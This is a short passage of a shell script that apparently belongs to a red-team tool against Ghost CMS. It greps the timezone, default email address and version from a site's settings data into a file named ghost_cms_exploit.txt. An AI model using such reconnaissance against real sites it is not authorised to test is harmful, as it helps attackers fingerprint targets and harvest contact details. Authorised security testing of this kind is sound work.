        echo "$settings" | grep -oP '"timezone":\s*"[^"]+"' >> "$SESSION/rt/ghost_cms_exploit.txt" 2>/dev/null
        echo "$settings" | grep -oP '"default_email_address":\s*"[^"]+"' >> "$SESSION/rt/ghost_cms_exploit.txt" 2>/dev/null
        echo "$settings" | grep -oP '"version":\s*"[^"]+"' >> "$SESSION/rt/ghost_cms_exploit.txt" 2>/dev/null

